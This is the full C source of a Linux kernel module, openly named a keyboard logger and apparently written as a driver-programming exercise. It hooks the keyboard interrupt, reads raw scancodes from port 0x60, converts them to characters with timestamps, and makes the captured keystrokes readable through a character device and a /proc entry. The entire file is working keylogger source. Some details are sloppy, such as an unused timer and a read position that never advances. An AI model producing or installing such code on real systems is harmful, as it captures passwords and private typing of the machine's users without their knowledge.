#include <linux/module.h>
#include <linux/platform_device.h>
#include <linux/interrupt.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/wait.h>
#include <linux/sched.h>
#include <linux/poll.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <linux/seq_file.h>
#include <linux/version.h>
#include <linux/timekeeping.h>
#include <linux/time.h>

#define DEVICE_NAME     "virtkeydev"
#define CLASS_NAME      "virtkey"
#define IOCTL_CLEAR     _IO('k', 1)
#define MAX_KEYS        256

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Harsha");
MODULE_DESCRIPTION("Virtual Keyboard Logger with Workqueue and Formatted Time");

#define KEYBOARD_IRQ    1
#define KEYBOARD_PORT   0x60

struct key_event {
    char key;
    char time_str[32];
};

static struct key_event key_log[MAX_KEYS];
static int buf_head = 0;
static int buf_tail = 0;

static DECLARE_WAIT_QUEUE_HEAD(waitq);
static int data_available = 0;

static dev_t dev_number;
static struct cdev virt_cdev;
static struct class *virt_class;

static struct timer_list my_timer;
static struct workqueue_struct *my_wq;
static struct work_struct my_work;

static const char scan_code_table[128] = {
    [0x02] = '1', [0x03] = '2', [0x04] = '3', [0x05] = '4',
    [0x06] = '5', [0x07] = '6', [0x08] = '7', [0x09] = '8',
    [0x0A] = '9', [0x0B] = '0',
    [0x10] = 'q', [0x11] = 'w', [0x12] = 'e', [0x13] = 'r',
    [0x14] = 't', [0x15] = 'y', [0x16] = 'u', [0x17] = 'i',
    [0x18] = 'o', [0x19] = 'p',
    [0x1E] = 'a', [0x1F] = 's', [0x20] = 'd', [0x21] = 'f',
    [0x22] = 'g', [0x23] = 'h', [0x24] = 'j', [0x25] = 'k',
    [0x26] = 'l',
    [0x2C] = 'z', [0x2D] = 'x', [0x2E] = 'c', [0x2F] = 'v',
    [0x30] = 'b', [0x31] = 'n', [0x32] = 'm',
    [0x39] = ' '
};

static void work_handler(struct work_struct *work)
{
    unsigned char scancode = inb(KEYBOARD_PORT);
    char ascii = scan_code_table[scancode & 0x7F];

    if (scancode < 0x80 && ascii) {
        struct key_event *e = &key_log[buf_head % MAX_KEYS];
        struct timespec64 ts;
        struct tm tm;

        e->key = ascii;
        ktime_get_real_ts64(&ts);
        time64_to_tm(ts.tv_sec, 0, &tm);
        snprintf(e->time_str, sizeof(e->time_str), "%04ld-%02d-%02d %02d:%02d:%02d",
                 tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
                 tm.tm_hour, tm.tm_min, tm.tm_sec);

        buf_head++;
        data_available = 1;
        wake_up_interruptible(&waitq);
    }
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
    queue_work(my_wq, &my_work);
    return IRQ_HANDLED;
}

static ssize_t virt_read(struct file *filp, char __user *buf, size_t count, loff_t *off)
{
    char tmp[2048];
    int i, len = 0;

    if (wait_event_interruptible(waitq, data_available))
        return -ERESTARTSYS;

    for (i = buf_tail; i < buf_head && len < sizeof(tmp) - 1; i++) {
        struct key_event *e = &key_log[i % MAX_KEYS];
        len += snprintf(tmp + len, sizeof(tmp) - len, "Key: %c | Time: %s\n", e->key, e->time_str);
    }

    data_available = 0;

    if (copy_to_user(buf, tmp, len))
        return -EFAULT;

    return len;
}

static long virt_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case IOCTL_CLEAR:
        buf_head = buf_tail = 0;
        return 0;
    default:
        return -EINVAL;
    }
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = virt_read,
    .unlocked_ioctl = virt_ioctl,
};

static int proc_show(struct seq_file *m, void *v)
{
    int i;
    seq_puts(m, "\nLogged Keys:\n");
    for (i = buf_tail; i < buf_head; i++) {
        struct key_event *e = &key_log[i % MAX_KEYS];
        seq_printf(m, "Key: %c | Time: %s\n", e->key, e->time_str);
    }
    return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, proc_show, NULL);
}

static const struct proc_ops proc_fops = {
    .proc_open = proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static int virt_probe(struct platform_device *pdev)
{
    int ret;

    ret = request_irq(KEYBOARD_IRQ, irq_handler, IRQF_SHARED, "virtkey", &virt_cdev);
    if (ret)
        return ret;

    my_wq = create_singlethread_workqueue("virt_wq");
    INIT_WORK(&my_work, work_handler);

    timer_setup(&my_timer, NULL, 0);

    proc_create("virt_keylog", 0, NULL, &proc_fops);

    return 0;
}

static int virt_remove(struct platform_device *pdev)
{
    free_irq(KEYBOARD_IRQ, &virt_cdev);
    remove_proc_entry("virt_keylog", NULL);
    flush_workqueue(my_wq);
    destroy_workqueue(my_wq);
    return 0;
}

static struct platform_driver virt_platform_driver = {
    .driver = {
        .name = DEVICE_NAME,
        .owner = THIS_MODULE,
    },
    .probe = virt_probe,
    .remove = virt_remove,
};

static struct platform_device *virt_device;

static int __init virt_init(void)
{
    alloc_chrdev_region(&dev_number, 0, 1, DEVICE_NAME);
    cdev_init(&virt_cdev, &fops);
    cdev_add(&virt_cdev, dev_number, 1);

    virt_class = class_create(CLASS_NAME);
    device_create(virt_class, NULL, dev_number, NULL, DEVICE_NAME);

    virt_device = platform_device_register_simple(DEVICE_NAME, -1, NULL, 0);
    platform_driver_register(&virt_platform_driver);

    pr_info("Virtual Keylogger Loaded\n");
    return 0;
}

static void __exit virt_exit(void)
{
    device_destroy(virt_class, dev_number);
    class_destroy(virt_class);
    cdev_del(&virt_cdev);
    unregister_chrdev_region(dev_number, 1);

    platform_device_unregister(virt_device);
    platform_driver_unregister(&virt_platform_driver);
    pr_info("Virtual Keylogger Unloaded\n");
}

module_init(virt_init);
module_exit(virt_exit);

